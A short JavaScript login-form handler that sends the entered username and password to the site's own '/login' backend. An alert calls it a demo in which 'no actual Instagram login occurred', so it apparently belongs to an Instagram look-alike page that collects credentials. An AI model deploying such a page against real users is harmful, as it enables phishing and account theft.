document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault(); // Prevent the default form submission

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Basic validation
    if (!username || !password) {
        alert('Please enter both username/email and password.');
        return;
    }

    try {
        // Send the login data to our backend server
        const response = await fetch('/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ username, password }),
        });

        if (response.ok) {
            alert('Login attempt processed. (This is a demo, no actual Instagram login occurred)');
            // Optionally, you could redirect the user or show a success message
            // window.location.href = '/success-page';
        } else {
            const errorText = await response.text();
            alert(`Failed to process login attempt: ${errorText}`);
        }
    } catch (error) {
        console.error('Error during login fetch:', error);
        alert('An error occurred while trying to log in. Please try again.');
    }
});
